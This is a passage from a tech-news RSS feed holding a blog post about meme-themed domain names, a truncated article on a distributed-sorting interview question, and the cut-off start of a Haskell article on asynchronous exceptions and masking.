hcjiZxW5GiteQgeze7JgfcTGauEnTWOEAXmFTVjXPYnW5ZtgaKyF01eJTAoH5%2bHD8LS3IzU1Gqmb%2b5C%2buRtZPRuR7LAiXBOOhuVd6CwfkEL3K3rJffvwgLiIr4gnSKFhsnyuVJgVXy6WUjMWK2XcT4qyIQ6IvbJY48KNwfgchRCHDletXpFBqbSMQmWFrGxXqZZBGI1GaNSaWZY1oIgsz7HElmaX443iuNOT2cAqN%2bSD3VQscSxyuLD1uSdg0ALFkzE6Bt7sOnR2TcDuzIDObIKzMAdZXevh2juBjMYWZK1YhfThIaQuXiTfiY93oKqpA6v0a2jfEtQqFuOyOI9z4j40aBthCDIjPjieGrJ88oBFUlY%2bm7mJz99GoB0VkzJzzIhzOEm1C4f0KHkEcwcDwcTJ3v6ouIZ%2bVR%2bEwWiASW2ifLpCMisv3imGJNPmzPYCPBhpVphdh9nfQqBw7LHS7DlsKUaWawN%2bV6fQyg8a1TU9KKIKkKvCWIcNbq8bGXU18NbVwltGnWRzIxU%2bfs/xZpciL68edUF1FOeRcp%2bqoHIIswppUXpUJ5igDguG0CplvcGZyUq1RyHxQRXFNnsik9sa4okh4oP7ifVfEi9QGB0iXbySwLmiZU9YILLhVWVSIWQMQ4m6SCpeSgpymcuFA/MAxzm7ObsNo8yux6zKyjMnbKG6gMmIm57jFKvsNWXkEXxgEhUtilABW0oGYi1WqvNDEGWOpNogCp5MF5zuFGTkeREVZZINT6haDQ2FY5wmTuZp9rYM6jx1FqoKFSF4Nt2Ol/fVYzw4CNoIk9yb%2b5SlxPQcouyRbFnmCjYQG4cV5Qz2bfF1XKVulr9ZXBJn8SClRa5YE1UJ76dBVpyF7xad0u3ZdXhwzEcQ%2bXGWYPcJJVLk3MsEs4JCgec9ZHXODpwpllFWSKe6nS2uUoVSh2fyd3ZEjmZLjIxzZ2aqZHxbagq1vuFwpaciLsEfZgZloJnKhNqghVEZTCAL/LgiBldztLiTGiah1UCn1cx6ZpysAZh/YkSMLHrYSzkrBHiJ%2bepF8S3KKkclxzGnHCSuiFHFQKiNavjUVRTvd1KM9Eo3Zk9gAmSW5/I2k1pb9oJAi8qkwyUyW4BdkA/geYAEA4P7%2bgAAPCxJFnJhNaJjiQAJhODgYCTYEhGbQH2EySgHr%2bNsE6GlOYF23G7GtaRoSmnhaAnTIs0cDS3tGTG7NvAhhstx9sQEqvC4ZymhYo5DoVks8f%2btkeT9T/GSDOVWAucnNLeriK/0Rj3i1HHyQbD8GitmP0boyPJGKQz39oFn3P5yypnfrooPtbCB%2b6xgELls4BlbPygoCMEhwRIIvqelyjEkJARqaoB4fWCtUsWFlUBPqhXLLVGkmICZZA1R8VoKF532I%2bf6DZIkyZw7VA7lACnzcw4VBodDmOuXaFWUvxAKoZr7wz34Jxmf5p2/hRFMIMs0GB4eDiURkUKhkLHK1yBlkLzHv9kjpKKK9xUNrA/cm/8s8Fu%2bq/zgvvPvyXVKxUfWzF8XxHMJspi7N3/MB1%2buJ7l5SB0U/ueB/UKUIe%2bvofY6NJSKtwjqBoOClLcEUYXik67/63pOMIcnf4TMyPDC56ulQsSKyspqJCXZ0NnZjcLCYtTWNtD9ZKru1Cgqcsy9nJ9fjIIC6sJc6YRqMHJzi%2baeMaB5eYU0ilBdXYuqqhqUlVUh1eXB8uVtdK8OsbF%2b1s/KWoCWlhWw21OxcGElVYjpJEsNiovL0dDQDIslfm7fkpJyWp9H79fTnovR3LwMaWnps2cGoa6uEb5FtViyZCnJU0DrK/wtfma21I/3Ky2toHkdKip8iIujvYOCQjAy0oW2tmqsXbsYV67sQcfaGjz22HE0Ni7CkSM70dRUCmuykRocn9wwKcmM%2b04O4MEH9%2bKuu3pJ%2bFicODGMCAIpeJb0du7swcMPH8P27etx6FA/rl8/jKGhNXj2q%2bdw9ux2Ei5XrhsaXkvPjmFqapjGACYnt2B0dDMuXNiF6elJ2ChL8DqXKxGnTg%2bRfBOYmRmj53vwxBOnCbQ8/0cZyjhXrx6id/bi6adPY9myepJpBCn2GJJlHSYmevD88w/ghRcewVNPncTRo0OoqSGj6XQGUiiSLErpLtOClJQIJCebyCuiYTSqyIoJ9Jx4QhNKaPv//47BEAa320zWsKCs3E5rqTwtSkJ6umUunOLjdbQmSl5zc%2bPhdJqQR2e43ZGkTCTt4W%2bebLYI8qwkeL2xcu7xmJGdbUFOjkXuGRdn8KdGE9UPzkh5Py0tWu5XXJxEV/Nc%2bLGsWVlxdLXQPrGkE/9OoPOi5DOnMwIOGl5vDHkv7x3h5wD%2bbH274vxW7HUrz5w/OHRlFggLC5OHKJWKWRYOzN%2b/%2bl9QzF05TjnOs7MXyBjj%2b8yq9hQXrFY7WaeUnuXOO0wxx/Dzye/D576fBRRz530wsyg%2bsGY%2bOPK3UvER2T/uvbksoFarPwFqfqGmpw/iwIERiusu7Ns3QCCGQkvl6e7dmzE21otjx/bTtY9CyiIJ6m%2bxDlCpVLPtMGUCrsL%2bnKFS%2bYumigo7WT6OsoaTGNnlr/pIUZ7X1KQhNy%2bJWNlDceiG2WySf/Lmiu/PPed2joAc7PnCYDCAQfgkg70mNFRDG%2bjIe7RyHnjGcx7h4ToCi9dQja7X0zvGT3zOX2L8P6stanIzAt/EAAAAAElFTkSuQmCC' /%3e%3c/svg%3e" data-srcset="/assets/static/all-your-base.e8fe0bf.c8886729d38e6661f35d808255c4d465.png 608w" data-src="/assets/static/all-your-base.e8fe0bf.c8886729d38e6661f35d808255c4d465.png" srcset="https://thomasvds.com/assets/static/all-your-base.e8fe0bf.c8886729d38e6661f35d808255c4d465.png 608w"></p>
<p>Being a DNS junkie at heart (see my past <a href="https://thomasvds.com/bing-and-brave-are-squatting-goo-gle-domains-so-i-joined-them/">Googlesquatting experiments</a>), the <code>us</code> word at the end of that sentence caught my eye. Let's see if the <code>allyourbasearebelongto.us</code> domain name is available ü§© !</p>
<p>The results got me really baffled. I checked both root and subdomains:</p>
<table>
<thead>
<tr>
<th><strong>Domain</strong></th>
<th><strong>Registered in</strong></th>
<th><strong>Target</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>allyourbasearebelongto.us</td>
<td>2019</td>
<td><a href="https://thomasvds.com/all-your-domain-are-belong-to-us/allyourbasearebelongto.us">DOMENE OG WEBHOTELL</a></td>
</tr>
<tr>
<td>all<code>.</code>yourbasearebelongto.us</td>
<td>2006</td>
<td>Old non-HTTPS site with Flash plugin</td>
</tr>
<tr>
<td>allyour<code>.</code>basearebelongto.us</td>
<td>2006</td>
<td>404</td>
</tr>
<tr>
<td>allyourbase<code>.</code>arebelongto.us</td>
<td>&nbsp;2016</td>
<td>No response</td>
</tr>
<tr>
<td>allyourbaseare<code>.</code>belongto.us</td>
<td>2002</td>
<td><a href="http://belongto.us/" target="_blank" rel="nofollow noopener noreferrer">Weird number cards</a></td>
</tr>
<tr>
<td>allyourbasearebelong<code>.</code>to.us</td>
<td>2002</td>
<td>No response</td>
</tr>
</tbody>
</table>

<p>This is a harsh reminder that <a href="https://www.reddit.com/r/Entrepreneur/comments/2dq7zv/how_do_you_get_past_the_feeling_that_everything/" target="_blank" rel="nofollow noopener noreferrer">everything has already been done on the Internet</a>. Still, none of these domains actually refers to the glorious meme - what a waste. IMHO, the folks owning the (probably priceless) <code>to.us</code> domain could have made a little effort here and put their domain to good use by hosting this meme.</p>
<p>A bit disappointed by these findings, I tried to come up with other ideas, like using the <code>.cat</code> extension because the guy in the meme is called CATS. But this one <a href="https://domini.cat/en/rules-of-the-cat-domain/" target="_blank" rel="nofollow noopener noreferrer">requires to publish in Catalan</a> üòÖ, and it's not a well known TLD.</p>
<p>So I shuffled possibilites a bit more and came up with <a href="http://allyourbasearebe.longto.us/" target="_blank" rel="nofollow noopener noreferrer">allyourbasearebe.longto.us</a>. Bingo! This one was not taken. Finally, the beloved meme now has a site of its own that honors it.</p>
<p>üëâ Check it out at <a href="http://allyourbasearebe.longto.us/" target="_blank" rel="nofollow noopener noreferrer">allyourbasearebe.longto.us</a>.</p>
<p>See you next time for more DNS hype!</p>
</div></div></div>]]>
            </description>
            <link>https://thomasvds.com/all-your-domain-are-belong-to-us/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26177583</guid>
            <pubDate>Thu, 18 Feb 2021 09:04:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Distributed Sorting ‚Äì Google Interview Question ‚Äì Algorithm and System Design]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26177521">thread link</a>) | @soygul
<br/>
February 18, 2021 | https://quanticdev.com/algorithms/distributed-computing/distributed-sorting | <a href="https://web.archive.org/web/*/https://quanticdev.com/algorithms/distributed-computing/distributed-sorting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        
<p>If you were given 1 TB of data and asked to sort it using 1000 computers, how would you do it. This is a Google senior interview question, and below is a summary of the optimum solution. In this article, we will do the full 2-hour interview stages together and get hired!</p>

<video width="1920" height="1080" controls=""><source src="https://quanticdev.com/algorithms/distributed-computing/media/intro.mp4" type="video/mp4"></video>

<p>First off, let‚Äôs check out the agenda for this writeup. We will start by visualizing the problem. Then we will continue with a concise design document. This is probably going to be on a whiteboard in a real interview, so we will keep it short. In the document, we will define the problem, do requirements analysis, do system design using a simple diagram, and finally do the complexity analysis. Then we will actually code and implement this system. Then we‚Äôll add some tests. And we will close it off with a discussion with the interviewers.</p>

<p>I will take you through the entire 2-hour interview in sections and do every section with an in-depth analysis. You are about to read the most in-depth late-stage senior interview analysis on the internet. So, sit back, relax, and turn up your brain to the max.</p>

<p>Table of contents:</p>
<ul>
  <li><a href="#resources">Resources</a></li>
  <li><a href="#overview">Overview</a></li>
  <li><a href="#problem-visualization">Problem Visualization</a></li>
  <li><a href="#design-document">Design Document</a>
    <ul>
      <li><a href="#problem-definition">Problem Definition</a></li>
      <li><a href="#requirements-analysis">Requirements Analysis</a></li>
      <li><a href="#system-design">System Design</a></li>
      <li><a href="#complexity-analysis">Complexity Analysis</a></li>
    </ul>
  </li>
  <li><a href="#implementation">Implementation</a></li>
  <li><a href="#tests">Tests</a></li>
  <li><a href="#discussion">Discussion</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="resources">Resources</h2>
<p>You can find the video version of this article on YouTube: <a href="https://www.youtube.com/watch?v=vgKjatRVtys" target="_blank" rel="noopener">https://www.youtube.com/watch?v=vgKjatRVtys</a></p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/vgKjatRVtys" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The video is fully animated. If you want to read the comments or leave a comment, do so under the YouTube video. If you want to contribute to the article, make a pull request on GitHub.</p>

<p>My simplified distributed sorting algorithm implementation:</p>
<ul>
  <li><a href="https://github.com/soygul/QuanticDev/blob/master/algorithms/distributed-computing/distributed-sorting/distributed-sorting.js" target="_blank" rel="noopener">https://github.com/soygul/QuanticDev/blob/master/algorithms/distributed-computing/distributed-sorting/distributed-sorting.js</a></li>
</ul>

<p>My k-way merge and tournament tree implementations and their tests:</p>
<ul>
  <li><a href="https://github.com/soygul/QuanticDev/tree/master/algorithms/merge" target="_blank" rel="noopener">https://github.com/soygul/QuanticDev/tree/master/algorithms/merge</a></li>
  <li><a href="https://github.com/soygul/QuanticDev/tree/master/algorithms/trees/tournament-tree" target="_blank" rel="noopener">https://github.com/soygul/QuanticDev/tree/master/algorithms/trees/tournament-tree</a></li>
</ul>

<p>Chromium Project Design Document Template:</p>
<ul>
  <li><a href="https://docs.google.com/document/d/14YBYKgk-uSfjfwpKFlp_omgUq5hwMVazy_M965s_1KA/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/14YBYKgk-uSfjfwpKFlp_omgUq5hwMVazy_M965s_1KA/edit</a></li>
</ul>

<p>My <a href="https://www.youtube.com/watch?v=Xo54nlPHSpg" target="_blank" rel="noopener">K-Way Merge</a> video, which explains k-way merge which is used extensively in this video.</p>

<p>My <a href="https://quanticdev.com/articles/software-engineer-compensation-guide" target="_blank" rel="noopener">Software Engineering Compensation Guide</a> article to help you estimate what you should be paid:</p>

<h2 id="overview">Overview</h2>
<p>Let‚Äôs check out the problem in hand. In this question, you are given 1 TB of data sitting in a database, and 1000 computers each with 1.5 GB of RAM. And you are asked to sort this data as fast as possible.</p>

<p><img src="https://quanticdev.com/algorithms/distributed-computing/distributed-sorting/media/distributed_sort_problem_definition.png" alt="Distributed Sorting Interview Question by Google"></p>

<p>This is a distributed sorting question asked by Google in a senior engineer interview. This was asked during the final interview round, and it is a hard question. In addition to the question being hard, the discussion held with the interviewer around other possible solutions, possible improvements, and external factors that might affect the performance, will test your deeper understanding of the topic. The source of this question is Hacker News, and you can find several versions of this question being discussed by ex-Googlers on HN. Obviously, I cannot reveal the source directly, but I am keeping a record of these questions as I find them to see how frequently they are asked. Distributed computing questions seem very frequent at senior Google interviews. On a side note, the original question was asked to be implemented using Python or C++ on a Kubernetes cluster. Finally, 2 hours is allocated for this interview, including design, implementation, and discussion. We will look into multiple approaches to solve this problem and investigate different requirements along with other variants that you might be given in an interview situation.</p>

<h2 id="problem-visualization">Problem Visualization</h2>
<p>Let‚Äôs start by visualizing the problem. When I am given a question, the first thing I do is to try to visualize it in my mind to investigate possible solutions quickly. I do this before jumping into the requirements analysis and start asking questions. If I am given a whiteboard, I will try to visualize the problem drawing a matrix, a diagram, or whatever might help me imagine possible solutions.</p>

<p>For this article, I will visualize this question using an animated diagram to help you understand it better. We start with our 1 TB of data in our database. Then comes our 1000 computers with 1.5 GB of RAM each. Let‚Äôs say we make each computer read 1 GB portion of our data from our database. Now we are left with 1000 nodes with all our data in them.</p>

<video width="1920" height="1080" controls=""><source src="https://quanticdev.com/algorithms/distributed-computing/media/problem_visualization.mp4" type="video/mp4"></video>

<p>Next, what do we do with this much data and this many nodes? How do we utilize the CPU power of all the nodes at the same time? We can try to make all nodes sort the data that they have in them. Remember, they all have 1.5 GB of RAM, and we have only used 1 GB of it. This gives us 500 MB of auxiliary space to work with. Heapsort only requires O(1) auxiliary space, so it is perfect for this job. Quicksort also only requires O(logn) auxiliary space, so we might use that too. We can decide this in the design phase.</p>

<p>Once each node finishes sorting their data simultaneously, how do we merge them? Well, there is a method called k-way merge designed exactly for this purpose. We can definitely use that! It is possible to implement k-way (also known as multiway) merge using a heap, or even better, using tournament trees. We start by selecting one of the nodes as the leader, the leader pulls the first values from each other node and puts them in a tournament tree. The root of the tree will be our first winner and the very first sorted value. Then we pull a new value in place of the missing value, complete our tournament tree and get the root again. We can keep doing this to get a sorted stream of data and write it back to our database into another table. This seems like a very workable approach. But will it match the requirements? We will have to discover that by asking lots of questions to the interviewers. But this is a good visualization and good initial approach which should hopefully help us come up with lots of good questions in the requirements analysis phase.</p>

<h2 id="design-document">Design Document</h2>
<p>In a regular coding interview, I would directly jump to the requirements analysis to select the best algorithm for the question in hand. However, this is the final interview stage with 2 hours to go. This is where you show off with your software engineering skills. So, we treat this as a serious project and start with a design document. Typically, design documents are very long and detailed. A well-crafted design increases the odds of success of a project. However, for this occasion, we will keep it short. Short enough to fit into a single whiteboard, or a single page if you are given paper. If you want to see a complete example, I have the link to Chromium Project‚Äôs Design Document Template in the resources section above.</p>

<p><img src="https://quanticdev.com/algorithms/distributed-computing/distributed-sorting/media/chromium_design_document_template.png" alt="Chromium Project Design Document Template"></p>

<h3 id="problem-definition">Problem Definition</h3>
<p>The very first section of each design document is the problem definition. The problem in hand is distributed sorting (also known as external sorting) of a very large dataset with memory-constrained nodes.</p>

<h3 id="requirements-analysis">Requirements Analysis</h3>
<p>This is probably the most crucial part of the entire interview. This is where your future will be decided. If you ask the right questions in this section and proceed to implementation in full agreement with the interviewers, you will have a great chance of passing the interview. The question that we are given is very generic and is lacking many important details. It is clear to me that the interviewer expects us to ask for clarifications, so we will do that soon. I would argue that a software engineering‚Äôs prime function is gathering requirements, so it is common for interviewers to ask vague questions to test your investigative skills. This part also reveals your depth of understanding of the topic. Let‚Äôs start with some important questions to the interviewer:</p>

<ul>
  <li><strong>Question: Is there any order, pattern, or uniform distribution in the initial data.</strong>
    <ul>
      <li>Their Answer: No.</li>
      <li>Comment: This means that we cannot take a shortcut by using specialized sorting techniques like bucket sort. If the given data had uniform distribution, we could simply partition it to all nodes and use bucket sort.</li>
    </ul>
  </li>
  <li><strong>Question: What shall I do with the final sorted data?</strong>
    <ul>
      <li>Their Answer: We will stream it to somewhere else for further processing.</li>
      <li>Comment: This is typical for data processing pipelines. We start with a set of nodes optimized for sorting and merging the data. Then we send the data to other nodes which are hardware optimized for other forms of processing.</li>
    </ul>
  </li>
  <li><strong>Question: What is the read speed of the database?</strong>
    <ul>
      <li>Their Answer: Let‚Äôs say 20 GB/s.</li>
      <li>Comment: This happens a lot in interviews. This means that the interviewer does not have a specific number in mind but wants you to assume that you should not be concerned with the database performance and assume that it is sufficient.</li>
    </ul>
  </li>
  <li><strong>Question: Will we separately store the sorted data in the database?</strong>
    <ul>
      <li>Their Answer: No.</li>
      <li>Comment: Interviewer already said that we were going to send the final sorted data somewhere else. This question was just to be extra sure.</li>
    </ul>
  </li>
  <li><strong>Question: What is the network latency between each computer node?</strong>
    <ul>
      <li>Their Answer: Let‚Äôs say not too bad.</li>
      <li>Comment: This means that you should not be concerned with the latency between the nodes. Maybe interviewers did not think of a scenario where you would want to use a distributed partitioning algorithm which would require a fast network.</li>
    </ul>
  </li>
  <li><strong>Question: Can we use all of 1.5 GB of memory in each node?</strong>
    <ul>
      <li>Their Answer: Yes.</li>
      <li>Comment: Again, this is good. When we have only 1 GB of data in each node, we can choose a sorting or partitioning algorithm that requires up to n/2 auxiliary space.</li>
    </ul>
  </li>
  <li><strong>Question: Do the computer nodes have disks or other persistent storage that we can write to?</strong>
    <ul>
      <li>Their Answer: No.</li>
      <li>Comment: This is expected. Involving persistent storage in our data processing would introduce yet another point of failure, so not so desirable.</li>
    </ul>
  </li>
</ul>

<p>I think this is enough questions for now. We clarified the task in hand quite ‚Ä¶</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://quanticdev.com/algorithms/distributed-computing/distributed-sorting">https://quanticdev.com/algorithms/distributed-computing/distributed-sorting</a></em></p>]]>
            </description>
            <link>https://quanticdev.com/algorithms/distributed-computing/distributed-sorting</link>
            <guid isPermaLink="false">hacker-news-small-sites-26177521</guid>
            <pubDate>Thu, 18 Feb 2021 08:55:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Asynchronous exceptions and interruptible operations in GHC (Haskell)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26177194">thread link</a>) | @coot
<br/>
February 17, 2021 | https://coot.me/posts/mask.html | <a href="https://web.archive.org/web/*/https://coot.me/posts/mask.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		

<div id="cb1"><pre><code><span id="cb1-1"><span>{-# LANGUAGE ScopedTypeVariables #-}</span></span>
<span id="cb1-2"><span>module</span> <span>Mask</span> <span>where</span></span></code></pre></div>
<div id="cb2"><pre><code><span id="cb2-1"><span>import</span> <span>Control.Concurrent.MVar</span></span>
<span id="cb2-2"><span>import</span> <span>Control.Exception</span></span>
<span id="cb2-3"><span>import</span> <span>System.FilePath</span> (<span>FilePath</span>)</span>
<span id="cb2-4"><span>import</span> <span>GHC.IO.Handle.Types</span> (<span>Handle__</span>)</span></code></pre></div>
<p>The base library explains asynchronous exceptions and masking quite well, but still this is one of the topics that is often misunderstood and some of its crucial parts like interruptible operations are not well enough documented to slip under the radar too often.</p>
<h2 id="synchronous-vs-asynchronous-exceptions">Synchronous vs Asynchronous exceptions</h2>
<p>There are two main ways of throwing exceptions in Haskell, either with <code><a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/Control-Exception.html#v:throwIO">throwIO</a></code> or <code><a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/Control-Exception.html#v:throwTo">throwTo</a></code>. <code>throwIO</code> throws an exception in the current thread in synchronous way, <code><a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/Control-Exception.html#v:throwTo">throwTo</a></code> allows to throw an exception in some other thread, hence the name asynchronous exceptions. But let‚Äôs start from the beginning, why we even need asynchronous exceptions? This is nicely answered in the paper <a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2016/07/asynch-exns.pdf">Asynchronous Exceptions in Haskell</a>:</p>
<blockquote>
<ul>
<li>
<strong>Speculative computation.</strong> A parent thread might start a child thread to compute some value speculatively; later the parent thread might decide that it does not need the value so it may want to kill the child thread.
</li>
<li>
<strong>Timeouts</strong>: If some computation does not complete within a specified time budget, it should be aborted.
</li>
<li>
<strong>User interrupt.</strong> Interactive systems often need to cancel a computation that has already been started, for example when the user clicks on the ‚Äústop‚Äù button in a web browser.
</li>
<li>
<strong>Resource exhaustion.</strong> Most Haskell implementations use a stack and heap, both of which are essentially finite resources, so it seems reasonable to inform the program when memory is running out, in order that it can take remedial action. Since such exceptions can occur at almost any program point, it is natural to treat them as asynchronous.
</li>
</ul>
</blockquote>
<p>Asynchronous exceptions can interrupt almost any computation, masking is provided as a way to make it predictable, so we can reason about it. Let‚Äôs examine this standard example:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>withLockUnmasked ::</span> <span>MVar</span> () <span>-&gt;</span> <span>IO</span> a <span>-&gt;</span> <span>IO</span> a</span>
<span id="cb3-2">withLockUnmasked lock k <span>=</span> <span>do</span></span>
<span id="cb3-3">  takeMVar lock</span>
<span id="cb3-4">  a <span>&lt;-</span> <span>catch</span> k (\(<span>e ::</span> <span>SomeException</span>) <span>-&gt;</span> putMVar lock ()</span>
<span id="cb3-5">                                      <span>&gt;&gt;</span> throwIO e)</span>
<span id="cb3-6">  putMVar lock () </span>
<span id="cb3-7">  <span>return</span> a</span></code></pre></div>
<p>The problem with <code>withLockUnmasked</code> is that an asynchronous exception could be thrown just after <code>takeMVar</code> is executed but before the <code>catch</code> installs the handler. To be able to fix this, Haskell provides primitive operations which allow to mask asynchronous exceptions. Each thread keeps the following masking state (original haddocks preserved):</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>-- | Describes the behaviour of a thread when an asynchronous</span></span>
<span id="cb4-2"><span>-- exception is received.</span></span>
<span id="cb4-3"><span>data</span> <span>MaskingState</span></span>
<span id="cb4-4">  <span>=</span> <span>Unmasked</span></span>
<span id="cb4-5">  <span>-- ^ asynchronous exceptions are unmasked (the normal state)</span></span>
<span id="cb4-6">  <span>|</span> <span>MaskedInterruptible</span></span>
<span id="cb4-7">  <span>-- ^ the state during 'mask': asynchronous exceptions are masked, but</span></span>
<span id="cb4-8">  <span>-- blocking operations may still be interrupted</span></span>
<span id="cb4-9">  <span>|</span> <span>MaskedUninterruptible</span></span>
<span id="cb4-10">  <span>-- ^ the state during 'uninterruptibleMask': asynchronous exceptions are</span></span>
<span id="cb4-11">  <span>-- masked, and blocking operations may not be interrupted</span></span></code></pre></div>
<p>Let us stress that in <code>MaskedInterruptible</code> state, which is a result of using <code><a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/GHC-IO.html#v:mask">mask</a></code> function, asynchronous exceptions can be thrown, but only by interruptible operations. In the <code>MaskedUninterruptible</code> asynchronous exceptions cannot be thrown even by blocking / interruptible operations. <a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2016/07/asynch-exns.pdf">Asynchronous Exceptions in Haskell</a> paper specifies interruptible operations as:</p>
<blockquote>
Any operation which may need to wait indefinitely for a resource (e.g.,takeMVar) may receive asynchronous exceptions even within an enclosing mask, but only while the resource is unavailable.Such operations are termed interruptible operations.
</blockquote>
The complete list of interruptible operations is astonishingly short:
<ul>
<li>
<code>takeMVar</code> when the <code>MVar</code> is empty,
</li>
<li>
<code>putMVar</code> when the <code>MVar</code> is non-empty,
</li>
<li>
<a href="https://hackage.haskell.org/package/stm/docs/Control-Monad-STM.html#v:retry"><code>retry :: STM a</code></a>,
</li>
<li>
<a href=""><code>throwTo</code></a>
</li><li>
<a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/ffi.html#interruptible-foreign-calls">interrutible ffi calls</a>.
</li>

</ul>
In particular none of the operations listed below are interruptible:
<ul>
<li>
<code>IORef</code> operations,
</li>
<li>
<code>safe</code> and <code>unsafe</code> foreign calls. There is a subtle difference between <code>safe</code> and <code>unsafe</code> ffi: when a safe ffi returns haskell thread will check if there are pending asynchronous exceptions while haskell rts does not know about <code>unsafe</code> ffi calls.
</li>
</ul>
<p>We have two ways of fixing <code>withLockUnamsked</code>:</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>withLockMaskedInterruptible ::</span> <span>MVar</span> () <span>-&gt;</span> <span>IO</span> a <span>-&gt;</span> <span>IO</span> a</span>
<span id="cb5-2">withLockMaskedInterruptible lock k <span>=</span> mask <span>$</span> \unmask <span>-&gt;</span> <span>do</span></span>
<span id="cb5-3">  takeMVar lock</span>
<span id="cb5-4">  a <span>&lt;-</span> <span>catch</span> (unmask k)</span>
<span id="cb5-5">             (\(<span>e ::</span> <span>SomeException</span>) <span>-&gt;</span> putMVar lock ()</span>
<span id="cb5-6">                                    <span>&gt;&gt;</span> throwIO e)</span>
<span id="cb5-7">  putMVar lock () </span>
<span id="cb5-8">  <span>return</span> a</span>
<span id="cb5-9"></span>
<span id="cb5-10"><span>withLockMaskedUninterruptible ::</span> <span>MVar</span> () <span>-&gt;</span> <span>IO</span> a <span>-&gt;</span> <span>IO</span> a</span>
<span id="cb5-11">withLockMaskedUninterruptible lock k <span>=</span> uninterruptibleMask <span>$</span> \unmask <span>-&gt;</span> <span>do</span></span>
<span id="cb5-12">  takeMVar lock</span>
<span id="cb5-13">  a <span>&lt;-</span> <span>catch</span> (unmask k)</span>
<span id="cb5-14">             (\(<span>e ::</span> <span>SomeException</span>) <span>-&gt;</span> putMVar lock ()</span>
<span id="cb5-15">                                    <span>&gt;&gt;</span> throwIO e)</span>
<span id="cb5-16">  putMVar lock () </span>
<span id="cb5-17">  <span>return</span> a</span></code></pre></div>
<p>The difference between both of them is subtle. To get to the point we need to analyse which operations are blocking / interruptible. As specified in <a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2016/07/asynch-exns.pdf">Asynchronous Exceptions in Haskell</a>, <code>takeMVar</code> is blocking only if <code>v :: MVar ()</code> is empty. We have two cases:</p>
<ul>
<li><p><em><code>v</code> is non-empty:</em> neither of the two can raise asynchronous exception while executing <code>takeMVar</code>. This means that both implementations will install the exception handler before an asynchronous exception is raised, and this is what we wanted.</p></li>
<li><p><em>if <code>v</code> is empty:</em> the semantics of <code>MVar</code> ensures that <code>takeMVar</code> is interruptible until it is empty, once <code>takeMVar</code> takes the value it becomes non-blocking. This ensure that asynchronous exceptions can be raised by <code>withLockMaskedInterruptible</code> only when <code>takeMVar</code> is blocked. This also means that <code>withLockMaskedInterruptible</code> will install the catch handler once <code>takeMVar</code> past the point of being interruptible.</p></li>
</ul>
<p>The crucial difference between <code>withLockMaskedInterruptible</code> and <code>withLockMaskedUninterruptible</code> is that the later will never throw an async exception while <code>takeMVar</code> is blocked while the lock is empty (e.g.&nbsp;taken by some other thread).</p>
<p>It seem that analysing the code which is using <code>mask</code> is more difficult than when using <code>uninterruptibleMask</code>, is it really so? The main problem with <code>withLockMaskedUninterruptible</code> is that it can potentially introduce deadlocks; a program might become unresponsive: interruptions like one delivered by signals (e.g.&nbsp;<code>CTRL-C</code>) are delivered using asynchronous exceptions; or it could introduce undeliverable timeouts, which in networking applications can introduce safety hazards. Because deadlocks are non-local properties there is actually no way to analyse if <code>withLockMaskedUninterruptible</code> is safe or not without its context, it depends on the program where it is used. For this reasons the documentation of <code>uninterruptibleMask</code> says in capital letters: THIS SHOULD BE USED WITH GREAT CARE. In my experience, debugging asynchronous exceptions is easier than debugging deadlocks. When logging is done right you can see asynchronous exceptions in the logs, but you will not see a bunch of threads being deadlocked.</p>
<p>Takeaways from this are:</p>
<ul>
<li><a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/GHC-IO.html#v:mask">mask</a> masks asynchronous exceptions only in non-interruptible code allowing to raise asynchronous exceptions in blocking operations;</li>
<li><a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/GHC-IO.html#v:uninterruptibleMask">uninterruptibleMask</a> masks asynchronous exceptions, but it can introduce deadlocks;</li>
<li><code>takeMVar</code> is only blocking if the <code>MVar</code> is empty.</li>
</ul>
<h2 id="base-and-safe-exceptions-unliftio">‚Äòbase‚Äô and ‚Äòsafe-exceptions‚Äô / ‚Äòunliftio‚Äô</h2>
<p>Both <a href="https://hackage.haskell.org/package/safe-exceptions">safe-exceptions</a> and <a href="https://hackage.haskell.org/package/unliftio">unliftio</a> are using <code>bracket</code> implementation which is masking using <code>uninterruptibleMask</code>, while <a href="https://hackage.haskell.org/package/base">base</a> package is using <code>mask</code>. Which one is more appropriate in a library?</p>
<p>This is <a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/Control-Exception-Base.html#v:bracket">base</a>‚Äôs implementation of <code><a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/Control-Exception-Base.html#v:bracket">bracket</a></code>:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>bracket ::</span> <span>IO</span> a</span>
<span id="cb6-2">        <span>-&gt;</span> (a <span>-&gt;</span> <span>IO</span> b)</span>
<span id="cb6-3">        <span>-&gt;</span> (a <span>-&gt;</span> <span>IO</span> c)</span>
<span id="cb6-4">        <span>-&gt;</span> <span>IO</span> c</span>
<span id="cb6-5">bracket before after thing <span>=</span></span>
